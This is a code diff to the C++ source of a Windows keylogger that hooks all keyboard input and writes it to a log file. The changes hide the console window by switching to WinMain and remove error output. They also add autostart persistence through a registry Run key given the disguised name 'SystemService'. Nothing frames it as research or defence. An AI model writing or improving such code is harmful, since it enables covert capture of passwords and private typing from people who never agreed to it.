@@ -9,6 +9,14 @@ bool rShiftHeld = false;
 
 std::fstream logFile;
 
+bool isCapsLockOn() {
+    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+}
+
+bool isNumLockOn() {
+    return (GetKeyState(VK_NUMLOCK) & 0x0001) != 0;
+}
+
 std::string getTimestamp() {
     SYSTEMTIME st;
     GetLocalTime(&st);
@@ -344,14 +352,6 @@ void specialKey(std::fstream &file, int key){
     }
 }
 
-bool isCapsLockOn() {
-    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-}
-
-bool isNumLockOn() {
-    return (GetKeyState(VK_NUMLOCK) & 0x0001) != 0;
-}
-
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
@@ -386,38 +386,42 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
-int main(){
-    std::cout.setf(std::ios::unitbuf);
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
+
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+    std::string logPath(exePath);
+    logPath = logPath.substr(0, logPath.find_last_of("\\/")) + "\\keylog.txt";
 
     HKL hkl = GetKeyboardLayout(0);
     LANGID langId = LOWORD(hkl);
-
     char langName[256];
     char localeName[256];
-
     GetLocaleInfoA(langId, LOCALE_SENGLISHLANGUAGENAME, langName, sizeof(langName));
     GetLocaleInfoA(langId, LOCALE_SLOCALIZEDDISPLAYNAME, localeName, sizeof(localeName));
 
-    logFile.open("Keylog.txt", std::ios::out | std::ios::app);
-    if(logFile.is_open()){
-        logFile << "\n" << getTimestamp() << "\n";
-        logFile << "Language: " << langName << "\n" << "Locale: " << localeName << '\n';
-        logFile.flush();
-    }else{
-        std::cerr << "Failed to open log file.\n";
-        return 1;
-    }
+    logFile.open(logPath, std::ios::out | std::ios::app);
+    if(!logFile.is_open()) return 1;
+
+    logFile << "\n" << getTimestamp() << "\n";
+    logFile << "Language: " << langName << "\n" << "Locale: " << localeName << '\n';
+    logFile.flush();
 
     keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
-    if(!keyboardHook){
-        std::cerr << "Failed to install hook. Error: " << GetLastError() << "\n";
-        return 1;
-    } 
+    if(!keyboardHook) return 1;
+
+    HKEY hKey;
+    if(RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
+        RegCloseKey(hKey);
+    }
 
     MSG msg;
     while(GetMessage(&msg, NULL, 0, 0)){
-        TranslateMessage(&msg); 
-        DispatchMessage(&msg); 
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
     }
 
     UnhookWindowsHookEx(keyboardHook);
